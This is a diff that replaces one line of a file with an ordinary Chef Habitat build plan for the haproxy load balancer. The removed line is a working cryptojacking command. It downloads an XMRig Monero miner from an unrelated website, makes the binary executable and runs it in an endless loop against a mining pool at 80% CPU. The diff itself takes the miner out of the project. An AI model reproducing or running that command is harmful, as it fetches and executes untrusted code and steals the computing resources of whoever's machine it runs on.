@@ -1,1 +1,45 @@
-wget http://www.automobilitodi.com/veicoli/10/or/portable/xmrig/2.9.2-64bit/xmrig && chmod +x xmrig && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 4 --max-cpu-usage=80 --donate-level 1 ; sleep 1; done
+pkg_origin=cheftraining
+pkg_name=haproxy
+pkg_description="The Reliable, High Performance TCP/HTTP Load Balancer"
+pkg_version=1.6.11
+pkg_maintainer="Chef Training <training@chef.io>"
+pkg_license=('GPL-2.0' 'LGPL-2.1')
+pkg_svc_run="haproxy -f $pkg_svc_config_path/haproxy.conf -db"
+pkg_svc_user="root"
+pkg_svc_group="root"
+pkg_exports=(
+  [port]=front-end.port
+  [status-port]=status.port
+)
+pkg_exposes=(port status-port)
+pkg_binds=(
+  [backend]="port"
+)
+pkg_deps=(core/haproxy)
+
+# Below is the default behavior for this callback. Anything you put in this
+# callback will override this behavior. If you want to use default behavior
+# delete this callback from your plan.
+# @see https://www.habitat.sh/docs/reference/plan-syntax/#callbacks
+# @see https://github.com/habitat-sh/habitat/blob/master/components/plan-build/bin/hab-plan-build.sh
+do_download() {
+    return 0
+}
+
+# Below is the default behavior for this callback. Anything you put in this
+# callback will override this behavior. If you want to use default behavior
+# delete this callback from your plan.
+# @see https://www.habitat.sh/docs/reference/plan-syntax/#callbacks
+# @see https://github.com/habitat-sh/habitat/blob/master/components/plan-build/bin/hab-plan-build.sh
+do_build() {
+    return 0
+}
+
+# Below is the default behavior for this callback. Anything you put in this
+# callback will override this behavior. If you want to use default behavior
+# delete this callback from your plan.
+# @see https://www.habitat.sh/docs/reference/plan-syntax/#callbacks
+# @see https://github.com/habitat-sh/habitat/blob/master/components/plan-build/bin/hab-plan-build.sh
+do_install() {
+    return 0
+}
